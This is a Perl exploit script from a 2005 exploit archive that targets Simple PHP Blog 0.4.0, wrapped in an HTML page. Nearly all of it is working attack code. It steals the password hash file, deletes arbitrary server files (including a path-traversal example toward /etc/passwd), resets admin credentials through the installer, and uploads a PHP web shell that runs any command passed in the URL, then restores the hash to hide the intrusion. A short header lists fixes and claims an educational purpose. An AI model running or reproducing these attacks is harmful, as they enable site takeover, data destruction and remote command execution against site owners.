<html><head><title>Simple PHP Blog <= 0.4.0 Multiple Remote Exploits</title></head><pre>#!/usr/bin/perl -w
#===============================================================================
#	Title:		sphpblog_vulns.pl
#
#	Written by: 	Kenneth F. Belva, CISSP
#			Franklin Technologies Unlimited, Inc.
#			http://www.ftusecurity.com
#
#	Date: 		August 25, 2005
#
#	Version:	0.1
#
#	Description:	This program is for educational purposes only!
#			SimplePHPBlog as a few vulnerability which this
#			perl script demonstrates via an exploit.
#
#	Instructions:	Should be self-explanatory via the .pl help menu
#
#	Solutions:	
#			*** Solution 1
#			Change the line in comment_delete_cgi.php from
#			$logged_in = logged_in( false, true );    to
#			$logged_in = logged_in( true, true );
#
#			*** Solution 2
#			Place an .htaccess file with the following config in
#			the ./config directory:
#
#
#			#---------------------
#			#Snip .htaccess start
#			#---------------------			
#			IndexIgnore *
#
#			&lt;Files .htaccess&gt;
#			order allow,deny
#			deny from all
#			&lt;/Files&gt;
#			
#			&lt;Files *.txt&gt;
#			order allow,deny
#			deny from all
#			&lt;/Files&gt;
#			#---------------------
#			#Snip .htaccess end
#			#---------------------
#
#
#			*** Solution 3
#			See http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0885.html
#				for PHP modification to upload image script.
#===============================================================================



#-------------------------------------------------------------------------------
#	Global Paramaters
#-------------------------------------------------------------------------------
use strict;
use warnings;

use vars qw/ %args /;

use Getopt::Std;
require LWP::UserAgent;
my $ua = LWP::UserAgent-&gt;new;

#-------------------------------------------------------------------------------
#	Global Routines
#-------------------------------------------------------------------------------

#Determine Operating System
my $OperatingSystem = $^O;
my $unix = &quot;&quot;;

#Set OS Parameter
if (index(lc($OperatingSystem),&quot;win&quot;)!=-1){
		   $unix=&quot;0&quot;; #windows system
	    }else{
		    $unix=&quot;1&quot;; #unix system
	    }

#-------------------------------------------------------------------------------
#	The Main Menu
#-------------------------------------------------------------------------------

sub menu()
    {
	    if ($unix){system(&quot;clear&quot;);}
	    	else{system(&quot;cls&quot;);}

	    print &quot;
________________________________________________________________________________
		  SimplePHPBlog v0.4.0 Exploits
			     by
		     Kenneth F. Belva, CISSP
		   http://www.ftusecurity.com
________________________________________________________________________________

	Program	: $0
	Version	: v0.1
	Date	: 8/25/2005
	Descript: This perl script demonstrates a few flaws in
		  SimplePHPBlog.
	
	Comments: THIS PoC IS FOR EDUCATIONAL PURPOSES ONLY...
		  DO NOT RUN THIS AGAINST SYSTEMS TO WHICH YOU DO 
		  NOT HAVE PERMISSION TO DO SO!
		  
		  Please see this script comments for solution/fixes 
		  to demonstrated vulnerabilities. 
		  http://www.simplephpblog.com

	Usage	: $0 [-h host] [-e exploit]
	
		-?      : this menu
		-h      : host
		-e	: exploit
			(1)	: Upload cmd.php in [site]/images/
			(2)	: Retreive Password file (hash)
			(3)	: Set New User Name and Password
				[NOTE - uppercase switches for exploits]
				-U	: user name
				-P	: password
			(4)	: Delete a System File
				-F	: Path and System File 

	Examples: $0 -h 127.0.0.1 -e 2
		  $0 -h 127.0.0.1 -e 3 -U l33t -P l33t
		  $0 -h 127.0.0.1 -e 4 -F ./index.php
		  $0 -h 127.0.0.1 -e 4 -F ../../../etc/passwd
		  $0 -h 127.0.0.1 -e 1
	&quot;;	
        
	exit;
    }


#-------------------------------------------------------------------------------
#	Initial Routine
#-------------------------------------------------------------------------------

    sub init()
    {

	use Switch;
	
	# colon ':' after letter says that option takes variable
        my $opt_string = 'e:U:P:h:F:?';
        getopts( &quot;$opt_string&quot;, \%args ) or menu();
	
	#Load parameters
	my $exploit = $args{e};
	my $host = $args{h};
	my $user = $args{U};
	my $pass = $args{P};
	my $file = $args{F};
	
	# What shall we do today?
	switch (%args) {
		case &quot;?&quot;	{ menu();}
		case &quot;e&quot;	{
				switch ($exploit) {
					
					if ($unix){system(&quot;clear&quot;);}
					else{system(&quot;cls&quot;);}
					
					print &quot;
________________________________________________________________________________
		  SimplePHPBlog v0.4.0 Exploits
			     by
		     Kenneth F. Belva, CISSP
		    http://www.ftusecurity.com
________________________________________________________________________________&quot;;


					# Upload cmd.php to /images
					case &quot;1&quot; {	print &quot;\nRunning cmd.php Upload Exploit....\n\n&quot;;
							&amp;UploadCmdPHP($host);}
					# Retrieve Username &amp; Password hash
					case &quot;2&quot; {	print &quot;\nRunning Username and Password Hash Retrieval Exploit....\n\n&quot;;
							&amp;RetrievePwd($host.&quot;/config/password.txt&quot;);}
					# Replace Username and Password
					case &quot;3&quot; {	print &quot;\nRunning Set New Username and Password Exploit....\n\n&quot;;
							&amp;SetUserPwd($host,$user,$pass);}
					# Delete a System File
					case &quot;4&quot; {	print &quot;\nRunning Delete System File Exploit....\n\n&quot;;
							&amp;DeleteFile($host . &quot;/comment_delete_cgi.php?y=05&amp;m=08&amp;comment=&quot;,$file);}

					} #end $exploit switch
					print &quot;\n\n\n*** Exploit Completed....\nHave a nice day! :)\n&quot;;
				} #end &quot;e&quot; case
		else		{ menu();}
		} #end %args switch

    } #end sub init

#-------------------------------------------------------------------------------
#	Exploit #1: Upload File Via POST 
#-------------------------------------------------------------------------------

sub UploadCmdPHP {

	
	my($url) = @_;
	
	use LWP;
	use HTTP::Request::Common qw(POST);
	my $ua = LWP::UserAgent-&gt;new;
	
	$HTTP::Request::Common::DYNAMIC_FILE_UPLOAD++;

	#Step 1: Retrieve hash
	#-----------------------------------------------------------------------
	my $hash = &amp;RetrievePwd($url.&quot;/config/password.txt&quot;);
	

	#Step 2: Delete Existing Password file (SetUserPwd)
	#Step 3: Create a temporary user id and password (SetUserPwd)
	#-----------------------------------------------------------------------
	&amp;SetUserPwd($url,&quot;a&quot;,&quot;a&quot;);
	

	#Step 4: Log into the app and get the PHPSession / my_id session variable
	#-----------------------------------------------------------------------
	my $SETcookie = &amp;strip_session(&amp;Login($url . &quot;/login_cgi.php&quot;,&quot;a&quot;,&quot;a&quot;));
	
	
	#Step 5: Create and upload our scripts (cmd.php &amp; reset.php)
	#-----------------------------------------------------------------------
		&amp;CreateTempPHPs();
	
	# Upload cmd.php
	my $path = &quot;./cmd.php&quot;;
	my $file = &quot;cmd.php&quot;;
	my $req = POST($url.&quot;/upload_img_cgi.php&quot;,
		Cookie =&gt; 'PHPSESSID='.$SETcookie.'; my_id='.$SETcookie,
		Content_Type =&gt; 'form-data',
		Content =&gt; [userfile =&gt; [$path,$file],],
		);
	
	my $response = $ua-&gt;request($req);
	print &quot;\nCreated cmd.php on target host: &quot; . $url;
	#$response-&gt;is_success or die &quot;Failed to POST '$url': &quot;, $response-&gt;status_line;
	#return $response-&gt;as_string;
	
	# Upload reset.php
	$path = &quot;./reset.php&quot;;
	$file = &quot;reset.php&quot;;
		
	$req = POST($url.&quot;/upload_img_cgi.php&quot;,
		Cookie =&gt; 'PHPSESSID='.$SETcookie.'; my_id='.$SETcookie,
		Content_Type =&gt; 'form-data',
		Content =&gt; [userfile =&gt; [$path,$file],],
		);
	
	$response = $ua-&gt;request($req);
	print &quot;\nCreated reset.php on target host: &quot; . $url;
	#$response-&gt;is_success or die &quot;Failed to POST '$url': &quot;, $response-&gt;status_line;
	#return $response-&gt;as_string;
	
		#Remove local PHP files
		&amp;RemoveTempPHPs();

		
	#Step 6: Reset origional Passwpord
	#-----------------------------------------------------------------------
	&amp;ResetHash($url.&quot;/images/reset.php&quot;,$hash);

	
	#Step 7: Pass command to delete reset.php (clean up)
	#-----------------------------------------------------------------------
	&amp;DeleteFile($url . &quot;/comment_delete_cgi.php?y=05&amp;m=08&amp;comment=&quot;,&quot;./images/reset.php&quot;);
	print &quot;\nRemoved reset.php from target host: &quot; . $url;

	print &quot;\n\nTo run command please go to following link: \n\t&quot; . $url.&quot;/images/cmd.php?cmd=[your command]&quot;;
}

#-------------------------------------------------------------------------------
#	Exploit #2: Retrieve Password File 
#-------------------------------------------------------------------------------

sub RetrievePwd {
	
	my($url) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent-&gt;new;

	my $req = GET($url);
	
	my $response = $ua-&gt;request($req);

	$response-&gt;is_success or die &quot;Failed to POST '$url': &quot;, $response-&gt;status_line;
	
	my $hash = $response-&gt;content;
	print &quot;\nRetrieved Username and Password Hash: &quot; . $hash; 
	return $hash

}


#-------------------------------------------------------------------------------
#	Exploit #3: Set New Username and Password 
#-------------------------------------------------------------------------------

sub SetUserPwd{

	my($url,$user,$pass) = @_;

	&amp;DeleteFile($url . &quot;/comment_delete_cgi.php?y=05&amp;m=08&amp;comment=&quot;, &quot;./config/password.txt&quot;);
	&amp;ResetPwd($url . &quot;/install03_cgi.php?blog_language=english&quot;,$user,$pass);
}


#-------------------------------------------------------------------------------
#	POST to Reset Username and Password (must delete password file first)
#-------------------------------------------------------------------------------

sub ResetPwd {
	
	my($url,$user,$pass) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent-&gt;new;

	my $req = POST($url,
		      [ user  =&gt; $user,
			pass =&gt; $pass,
			submit =&gt; '%C2%A0Submit%C2%A0'
			]
		);
	
	my $response = $ua-&gt;request($req);

	$response-&gt;is_success or die &quot;Failed to POST '$url': &quot;, $response-&gt;status_line;

	print &quot;\n./config/password.txt created!&quot;;
	print &quot;\nUsername is set to: &quot;.$user;
	print &quot;\nPassword is set to: &quot;.$pass;
	
}


#-------------------------------------------------------------------------------
#	Exploit #4: Delete Password File 
#-------------------------------------------------------------------------------

sub DeleteFile {
	
	my($url,$file) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent-&gt;new;

	my $req = GET($url.$file);
	
	my $response = $ua-&gt;request($req);

	$response-&gt;is_success or die &quot;Failed to POST '$url': &quot;, $response-&gt;status_line;
	print &quot;\nDeleted File: &quot;.$file; 
	
}


#-------------------------------------------------------------------------------
#	log into site
#-------------------------------------------------------------------------------

sub Login {

	my($url,$user,$pass) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent-&gt;new;

	my $req = POST($url,
		      [ user  =&gt; $user,
			pass =&gt; $pass,
			submit =&gt; '%C2%A0Submit%C2%A0'
			]
		);
	
	my $response = $ua-&gt;request($req);

	$response-&gt;is_success or die &quot;Failed to POST '$url': &quot;, $response-&gt;status_line;

	print &quot;\nLogged into SimplePHPBlog at: &quot;.$url;
	print &quot;\nCurrent Username '&quot;.$user.&quot;' and Password '&quot;.$pass.&quot;'...&quot;;
	
	return $response-&gt;header('Set-Cookie');
	
}


#-------------------------------------------------------------------------------
#	POST the hash
#-------------------------------------------------------------------------------

sub ResetHash {

	my($url,$hash) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent-&gt;new;

	my $req = POST($url,
		      [ hash  =&gt; $hash]
		);
	
	my $response = $ua-&gt;request($req);

	$response-&gt;is_success or die &quot;Failed to POST '$url': &quot;, $response-&gt;status_line;

	print &quot;\nReset Hash at: &quot;.$url;
	print &quot;\nReset Hash value: &quot;.$hash;
	
	
}


#------------------------------------------------------
# Create Temp PHP files
#------------------------------------------------------

sub CreateTempPHPs{

	my($hash) = @_;

	open(PHPFILE, &quot;&gt;./cmd.php&quot;);
	print PHPFILE &amp;CreateCmdPHP();
	close PHPFILE;
	print &quot;\nCreated cmd.php on your local machine.&quot;;
	
	open(PHPFILE, &quot;&gt;./reset.php&quot;);
	print PHPFILE &amp;CreateResetPHP();
	close PHPFILE;
	print &quot;\nCreated reset.php on your local machine.&quot;;	
}

#------------------------------------------------------
# Remove Temp PHP files
#------------------------------------------------------

sub RemoveTempPHPs{

	unlink(&quot;./cmd.php&quot;);
	print &quot;\nRemoved cmd.php from your local machine.&quot;;
	unlink(&quot;./reset.php&quot;);
	print &quot;\nRemoved reset.php from your local machine.&quot;;
	
}


#------------------------------------------------------
# strip_session - Get PHP Session Variable
#------------------------------------------------------

sub strip_session {
	
	my($savedata) = @_;

	my $PHPstring = &quot;PHPSESSID&quot;;
	my $semi = &quot;\;&quot;;
	
	my $datalength = length($savedata);
	my $PHPstart= (index $savedata, $PHPstring)+10;
	my $PHPend = index $savedata,$semi,$PHPstart;
	my $PHPsession= substr $savedata, $PHPstart, ($PHPend-$PHPstart);
	return $PHPsession;
	
}


sub CreateCmdPHP(){
	
	return &quot;

&lt;?php

\$cmd = \$_GET[\'cmd\'];
echo \'&lt;hr/&gt;&lt;pre&gt;\';
echo \'Command: \' . \$cmd;
echo '&lt;/pre&gt;&lt;hr/&gt;&lt;br&gt;';

echo '&lt;pre&gt;';
\$last_line = system(\$cmd,\$output);
echo \'&lt;/pre&gt;&lt;hr/&gt;\';
?&gt;.
&quot;; # end 
	
}


sub CreateResetPHP(){
	
	return &quot;

&lt;?php

\$hash = \$_POST[\'hash\'];
\$fp = fopen(\&quot;../config/password.txt\&quot;,\&quot;w\&quot;);
fwrite(\$fp,\$hash);
fpclose(\$fp);

?&gt;
&quot;; #end return

}


#------------------------------------------------------
# 	Begin Routines
#------------------------------------------------------
	init();

# milw0rm.com [2005-09-01]</pre></html>